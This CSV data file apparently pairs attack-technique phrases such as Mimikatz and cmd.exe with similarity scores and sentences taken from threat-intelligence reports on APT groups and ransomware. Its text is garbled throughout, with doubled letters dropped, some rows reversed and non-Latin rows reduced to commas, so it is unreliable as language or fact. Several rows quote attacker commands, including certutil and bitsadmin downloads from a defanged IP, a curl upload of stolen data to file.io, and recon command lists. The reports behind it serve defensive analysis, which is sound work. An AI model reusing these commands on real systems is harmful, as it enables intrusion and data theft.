hash,phrase,similarity,adjacent_sentences
f6c926edfa0eb75e375214e6fe43fa2f,Exploitation for Privilege Escalation,0.8312569646392747,"['Furthermore, the group showed mature capabilities for tuneling trafic and overjumping air gaps, respectively internet isolation of systems and networks.', 'The main lesons learned are: 1.', 'Entry point is very often the user.', 'The atackers use also diferent comunication media, like LinkedIn or WhatsAp and company mail.', 'Companies should train their users to detect and prevent spear phishing atacks and provide a clear and easy to use reporting proceses.', '2.', 'Although the technical level of the atackers is quite advanced, basic protective measures like automaticaly updated URL block lists in the proxy help with early detection and slowing down of such atacks.', '3.', 'If you recognize similar TPs or IOCs in your infrastructure, you should cary out very serious incident analysis, before trying to contain the incident.', 'Otherwise, evidence may be gone, and atackers stil might have aces to the network.', 'As in case of reinfection, the atackers reuse previously compromised asets.']"
e1baf1d01587423eb4aa184c8327f15f,Exploitation for Privilege Escalation,0.8312569646392747,"['1 6.5 Privilege Escalation .', '17 6.6 Defense Evasion .', '17 THE CHANGING THREAT LANDSCAPE IN 2021 .', '2 6.7 Credential Aces .', '19 1 Just Another Incident Response investigation?', '.', '2 6.8 Discovery .', '19 2 The Major Vulnerabilities in 2021 .', '3 6.9 Lateral Movement .', '20 6.10 Colection .', '20 3 A Spotlight on the Role of APT Groups .']"
5518f123e0610a71173f98d2a79b34ec,Exploitation for Privilege Escalation,0.8312569646392747,"['By 2023, it was two daysa ful wek les.', 'Especialy striking is how often atackers move quickly.', 'In almost 45% of our cases this year, atackers exfiltrated data in les than a day after compromise.', 'This means that almost half the time, organizations must respond within hours to stop them.', '3 Spotlight On: Sped Incident Response Report 2024 Casefile: Black Basta Ransomware How many minutes it can take for an atacker.', 'Phishing email starts the clock Initial entry starts: +30 minutes after phishing email Reconaisance starts: +15 minutes after initial entry (45 minutes elapsed) Privilege escalation and C2 starts: +45 minutes after recon (90 minutes elapsed) Exfiltration starts: +390 minutes after priv esc/C2 (8 hours elapsed) Acount modification starts: +80 minutes after exfil (9 hours and 20 minutes elapsed) Ransomware prep starts: +130 minutes after acount mod (1 hours and 30 minutes elapsed) Ransomware deployment starts: +125 minutes after prep starts (13 hours and 35 minutes elapsed) Figure 7.', 'In les than 14 hours, atackers gained aces to an organization, exfiltrated terabytes of data, and deployed ransomware to nearly 10,0 endpoints.', 'In certain kinds of cases, exfiltration hapens In one case involving Black Basta ransomware, it even faster.', 'While we expected that extortion tok atackers les than 14 hours to acomplish cases would be the fastest to exfiltration, that extensive compromise.', 'Starting with a simple wasnt the case.', 'In maters that dont involve phishing email, the threat group gained initial extortion, atackers are working within hours more entry to the organization a mere half hour later.']"
d5019121cbc645eb0787efab173a12b3,exploiting vulnerabilities in the remote desktop protocol (RDP).,0.7539985150857968,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
31347d89b18461f35448b26fefb00133,“cmd /c,0.8135172745614935,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
d5019121cbc645eb0787efab173a12b3,“cmd /c,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
6676698d65e372feb79c0159d9d2b11e,“cmd /c,0.8135172745614935,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
2f9cb1419d88d162b0fe29430bf53db3,Malware Obfuscation,0.8841982676041403,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
2f9cb1419d88d162b0fe29430bf53db3,Malware Obfuscation,0.8841982676041403,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
2f9cb1419d88d162b0fe29430bf53db3,Malware Obfuscation,0.8841982676041403,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
b061b87a72eab24273ab0a1d4675966b,"malware
also checks that the operating system version",0.7758607464961542,"['One pair was compiled in early August 2017 and the second pair was compiled ten days later.', 'Al four driver samples are digitaly signed with stolen certificates from game development companies, either the US-based Frostburn Studios or the Korean 43CR Company (43 ).', 'The signatures made with Frostburn Studios certificate are even timestamped.', 'Figure 8: Digital signature of a crtsys.sys driver Two of the samples are on VirusTotal and have a very low detection rate.', 'htps:/w.fortinet.com/blog/threat-research/dep-panda-log4shel-fire-chili-rotkits 5/16 4/27/2, 3:49 PM New Milestones for Dep Panda: Log4Shel and Digitaly Signed Fire Chili Rotkits Figure 9: Detection rates of the rotkit samples from VirusTotal The rotkit starts by ensuring the victim machine is not runing in safe mode.', 'It then checks the operating system version.', 'The rotkit uses Direct Kernel Object Modification (DKOM), which involves undocumented kernel structures and objects, for its operations.', 'For this reason, it relies on specific OS builds as otherwise it may cause the infected machine to crash.', 'In general, the latest suported build is Windows 10 Creators Update (Redstone 2), released in April 2017.', 'The purpose of the driver is to hide and protect malicious artifacts from user-mode components.', 'This includes four aspects: files, proceses, registry keys and network conections.']"
694d28159243554ebe634f76a1fad32b,"malware
also checks that the operating system version",0.7758607464961542,"['One pair was compiled in early August 2017 and the second pair was compiled ten days later.', 'Al four driver samples are digitaly signed with stolen certificates from game development companies, either the US-based Frostburn Studios or the Korean 43CR Company (43 ).', 'The signatures made with Frostburn Studios certificate are even timestamped.', '5/14 Figure 8: Digital signature of a crtsys.sys driver Two of the samples are on VirusTotal and have a very low detection rate.', 'Figure 9: Detection rates of the rotkit samples from VirusTotal 6/14 The rotkit starts by ensuring the victim machine is not runing in safe mode.', 'It then checks the operating system version.', 'The rotkit uses Direct Kernel Object Modification (DKOM), which involves undocumented kernel structures and objects, for its operations.', 'For this reason, it relies on specific OS builds as otherwise it may cause the infected machine to crash.', 'In general, the latest suported build is Windows 10 Creators Update (Redstone 2), released in April 2017.', 'The purpose of the driver is to hide and protect malicious artifacts from user-mode components.', 'This includes four aspects: files, proceses, registry keys and network conections.']"
01be204435044a83ae8553bc754a2b98,Mimikatz,1.0,"['2013 CVE-2013-063 CVE- 2013-0634 (Ladyboyle)1.23 2016 4 (Symantec) (Tick) 4, 1 LAC .5 2017 6 (SecureWorks) (Bronze Butler)6 , 7 7 1 8 .', '2018 6 42 USB .9 2014 .', '208 .', 'IT .', ', USB .', '.', '.', '1 htps:/w.symantec.com/conect/blogs/adobe-zero-day-used-ladyboyle-atack 2 htps:/w.fireye.com/blog/threat-research/2013/02/lady-boyle-comes-to-town-with-a-new-exploit.html 3 htps:/asec.ahnlab.com/912 4 htps:/w.symantec.com/conect/blogs/tick-cyberespionage-group-zeros-japan 5 htps:/w.lac.co.jp/english/report/2016/1/04_cgview_01.html 6 htps:/w.secureworks.com/research/bronze-butler-targets-japanese-busineses 7 htps:/unit42.paloaltonetworks.com/unit42-tick-group-continues-atacks/ 8 htps:/blog.trendmicro.com/trendlabs-security-inteligence/redbaldknight-bronze-butler-daserf-backdor-now-using- steganography/ 9 htps:/unit42.paloaltonetworks.com/unit42-tick-group-weaponized-secure-usb-drives-target-air-gaped-critical-systems/ AhnLab, Inc. Al rights reserved.', '3 Analysis Report_Tick Group 2014 .', ', , , , , , , IT .', ', MS , .']"
8f9fe74d1fa133e5e48b7e2f4d94214a,Mimikatz,0.759498461070385,"['The threat actors use built-in Windows administration tols and comercial of- the-shelf software to live of the land.', 'The threat actor at the keyboard uses RDP to aces compromised systems rather than a backdor or Remote Aces Trojan (RAT).', 'Post-exploitation persistence is maintained by harvesting paswords from a wide variety of sources such as proces memory, web browsers, network snifing, and keylogers.', 'There is no evidence of data theft, leaving the motivation behind Stolen Pencil largely uncertain.', 'Observed Sectors: Education and Think Tanks.', 'Tols used Mimikatz.', 'Information <htps:/w.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia> <htps:/unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national- security-think-tanks/> MITRE AT&CK <htps:/atack.mitre.org/groups/G086/> 219 Threat Group Cards: A Threat Actor Encyclopedia Stone Panda, APT 10, menuPas Names Stone Panda (CrowdStrike) APT 10 (Mandiant) menuPas Team (Symantec) menuPas (Palo Alto) Red Apolo (PwC) CVNX (BAE Systems) Potasium (Microsoft) Hogfish (iDefense) Hapyongzi (FireEye) Country China Motivation Information theft and espionage Description menuPas is a threat group that apears to originate from China and has ben active since aproximately 209.', 'The group has targeted healthcare, defense, aerospace, and government sectors, and has targeted Japanese victims since at least 2014.', 'In 2016 and 2017, the group targeted managed IT service providers, manufacturing and mining companies, and a university.', 'Observed Sectors: Aerospace, Defense, Government, Healthcare, MSPs and Pharmaceutical.', 'Countries: Australia, Brazil, Canada, Finland, France, India, Japan, Norway, Philipines, South Africa, South Korea, Sweden, Switzerland, Thailand, UK and USA.']"
d5019121cbc645eb0787efab173a12b3,Mimikatz,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,Mimikatz,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
ce2dca3dccbd8b655ff8ba8d06f2d408,Mimikatz,0.759498461070385,"['The threat actors use built-in Windows administration tols and comercial of- the-shelf software to live of the land.', 'The threat actor at the keyboard uses RDP to aces compromised systems rather than a backdor or Remote Aces Trojan (RAT).', 'Post-exploitation persistence is maintained by harvesting paswords from a wide variety of sources such as proces memory, web browsers, network snifing, and keylogers.', 'There is no evidence of data theft, leaving the motivation behind Stolen Pencil largely uncertain.', 'Observed Sectors: Education and Think Tanks.', 'Tols used Mimikatz.', 'Information <htps:/w.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia> <htps:/unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national- security-think-tanks/> MITRE AT&CK <htps:/atack.mitre.org/groups/G086/> 219 Threat Group Cards: A Threat Actor Encyclopedia Stone Panda, APT 10, menuPas Names Stone Panda (CrowdStrike) APT 10 (Mandiant) menuPas Team (Symantec) menuPas (Palo Alto) Red Apolo (PwC) CVNX (BAE Systems) Potasium (Microsoft) Hogfish (iDefense) Hapyongzi (FireEye) Country China Motivation Information theft and espionage Description menuPas is a threat group that apears to originate from China and has ben active since aproximately 209.', 'The group has targeted healthcare, defense, aerospace, and government sectors, and has targeted Japanese victims since at least 2014.', 'In 2016 and 2017, the group targeted managed IT service providers, manufacturing and mining companies, and a university.', 'Observed Sectors: Aerospace, Defense, Government, Healthcare, MSPs and Pharmaceutical.', 'Countries: Australia, Brazil, Canada, Finland, France, Germany, India, Japan, Netherlands, Norway, Philipines, South Africa, South Korea, Sweden, Switzerland, Thailand, UAE, UK and USA.']"
c91a9ca760ed281ab3a6e831ccac7850,Mimikatz,0.751353105890179,"['(RDP) .', '41 3.6.', 'Pas-the-hash, Pas-the-ticket .', '42 3.6.1.', 'WCE () .', '42 1 3.6.2.', 'Mimikatz() .', '4 3.7.', 'SYSTEM .', '45 3.7.1.', 'MS14-058 Exploit .']"
c91a9ca760ed281ab3a6e831ccac7850,Mimikatz,0.751353105890179,"['(RDP) .', '41 3.6.', 'Pas-the-hash, Pas-the-ticket .', '42 3.6.1.', 'WCE () .', '42 1 3.6.2.', 'Mimikatz() .', '4 3.7.', 'SYSTEM .', '45 3.7.1.', 'MS14-058 Exploit .']"
c91a9ca760ed281ab3a6e831ccac7850,Mimikatz,0.7778430984306982,"['PWDumpX .', '26 3.3.3.', 'Quarks PwDump .', '28 3.3.4.', 'Mimikatz () .', '29 3.3.5.', 'Mimikatz () .', '30 3.3.6.', 'WCE.', '31 3.3.7. gsecdump .', '32 3.3.8. lslsas .']"
c91a9ca760ed281ab3a6e831ccac7850,Mimikatz,0.7778430984306982,"['PWDumpX .', '26 3.3.3.', 'Quarks PwDump .', '28 3.3.4.', 'Mimikatz () .', '29 3.3.5.', 'Mimikatz () .', '30 3.3.6.', 'WCE.', '31 3.3.7. gsecdump .', '32 3.3.8. lslsas .']"
c91a9ca760ed281ab3a6e831ccac7850,Mimikatz,0.7815683517204072,"[' JPCERT 2016 6 28 1.', '.4 2.', '.5 2.1. .', '5 2.2. .', '6 2.3. .', '8 3.', '.9 3.1. .', '9 3.2.', '.1 1 3.2.1.', 'PsExec .1 1 3.2.2. wmic .', '13 3.2.3.']"
c91a9ca760ed281ab3a6e831ccac7850,Mimikatz,0.7815683517204072,"[' JPCERT 2016 6 28 1.', '.4 2.', '.5 2.1. .', '5 2.2. .', '6 2.3. .', '8 3.', '.9 3.1. .', '9 3.2.', '.1 1 3.2.1.', 'PsExec .1 1 3.2.2. wmic .', '13 3.2.3.']"
07e8e26ab8196bb14d491205902c10a7,Mimikatz,0.7693334627892614,"['2-2 2.2 APT3 Tol Functionality .', '2-4 2.2.1 Pirpi Functions .', '2-4 2.2.2 PlugX Functions.', '2-6 2.2.3 OSInfo Functions .', '2-7 2.2.4 Pwdump Functions.', '2-9 2.2.5 Mimikatz Functions .', '2-9 2.2.6 RemoteCMD Functions .', '2-9 2.2.7 Dsquery Functions .', '2-9 2.2.8 LaZagne Functions.', '2-10 2.2.9 ScanBox Functions .', '2-10 Emulation Phases .']"
920bbf3f4cf30cf9c556531074485448,cmd.exe,0.8176210416244082,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
31347d89b18461f35448b26fefb00133,cmd.exe,1.0,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
399c17d5f44d8b855c9751aae73f3c11,cmd.exe,0.8937965527573956,"['These files provide sequential execution of comands using algorithmic structures such as conditional operators and lops.', 'Seing as how cmd.exe is employed by atackers in a large number of cases and overlaps with other techniques of the MITRE AT&CK matrix, here we wil examine only a few examples of cmd.exe use at diferent stages of an atack without delving to dep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.', 'Here are al the reconaisance comands employed in the script: ver > :\\Windows\\Web\\systeminfo.txtb time /t > :\\Windows\\Web\\systeminfo.txtb date /t > :\\Windows\\Web\\systeminfo.txtb hostname > :\\Windows\\Web\\systeminfo.txtb systeminfo > :\\Windows\\Web\\systeminfo.txtb net localgroup Administrators > :\\Windows\\Web\\systeminfo.txtb ipconfig /al > :\\Windows\\Web\\systeminfo.txtb tasklist /v > :\\Windows\\Web\\systeminfo.txtb tasklist -svc > :\\Windows\\Web\\systeminfo.txtb net start > :\\Windows\\Web\\systeminfo.txtb ping w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb tracert -h 5 w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb netstat -aon > :\\Windows\\Web\\systeminfo.txtb netstat -bv > :\\Windows\\Web\\systeminfo.txtb net use > :\\Windows\\Web\\systeminfo.txtb net share > :\\Windows\\Web\\systeminfo.txtb net view > :\\Windows\\Web\\systeminfo.txtb net view /domain > :\\Windows\\Web\\systeminfo.txtb net group /domain > :\\Windows\\Web\\systeminfo.txtb net user > :\\Windows\\Web\\systeminfo.txtb net user /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain controlers"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain admins"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain computers"" /domain > :\\Windows\\Web\\systeminfo.txtb nltest /domain_trusts > :\\Windows\\Web\\systeminfo.txtb route print > :\\Windows\\Web\\systeminfo.txtb arp -a > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\program files\\*.', '*"" > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\Program Files (x86)\\*.']"
cd55962babfd80de741da3cfcd92ebe3,cmd.exe,0.82672272449881,"['It is worth noting that these samples were al compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Aditionaly, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed sugesting this is al part of the same campaign.', 'Despite this potential conection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware atempts to run a series of comands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These comands are as folows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Internet Setings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is sen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTP/1.1 Conection: Kep-Alive User-Agent: Mozila/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/2010101 Firefox/47.0 Host: w.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4c10ab3f4e6769e520694a10f61d5) does not use eye-watch[.', ']in as a C&C chanel but instead was downloaded from the URL: hxps:/w.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
4cfa49159667f23c95faae1778231c91,cmd.exe,0.845503132152836,"['Modular architecture of the victims infection proces provides both aditional flexibility and anonymity throughout the cyber-atack.', 'This scheme alows hackers to divide software development activity betwen teams, as wel as to ensure the reuse of program code.', 'Recon Performs initial reconaisance to determine if a systems is of interest to the threat actors Droper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TraficForwarder and injects into the legitimate proces Client_TraficForwarder Forwards operators comands from external network into corporate network Client_RAT Provides ful control over the target system Recon is a backdor that is initialy instaled on the target machine through sucesful execution of exploits.', 'This module is used by hackers to perform initial reconaisance to search for systems of interest.', 'Once launched, the program ads itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\ApData\\Roaming\\Microsoft\\Windows\\ Start Menu\\Programs\\Startup"", colects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data colected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\ CurentVersion\\Internet Setings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tols, atribution 1 Key 2 Atack 3 Atack 4 Recomendations 5 Indicators of 6 Apendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module wil use the ""kilkil"" comand to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Droper using the htp comand.', 'Droper wil then instal Client_RAT to the infected system as folows: RECON DROPER LOADER CLIENT_RAT 1 2 3 DROPER Recon decrypts LOADER Droper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Droper extracts decrypted Client_RAT Client_RAT Droper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Droper neds MD5 encryption key, which only the atacker knows.', 'Group-IB specialists have analyzed two versions of Droper.', 'There are no fundamental diferences betwen them: both versions were used to decrypt the loader and encrypted payload, as wel as to ensure loader persistence in the system.']"
d5019121cbc645eb0787efab173a12b3,cmd.exe,0.8135172745614935,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,cmd.exe,0.7962584600454754,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
af9a848f4c926a7dce431e4a9399b939,cmd.exe,0.7597704693771454,"['NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tol at its disposal, caled Symbexcel, that aplies symbolic execution techniques to the analysis of Excel macros.16 Using this tol, we can automaticaly de-obfuscate the XL4 macros and identify the aditional components being downloaded (se Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threfold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The atackers may chose to use multiple hosts to increase the chances to download the payload and improve suces rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by runing rundl32.exe.', '3.', 'Gain registry persistence by runing DlRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC comand line is shown Figure 6).', 'The payload is a DL file, which (unsurprisingly) is the main Emotet DL.', 'In the case of the Excel document with hash 7c0d0a80e7eb3af7ce549df78a5a68cbd5deb5, the DL is 8cf39a587aeb8f075a0ae23a42e16ce3656e71.']"
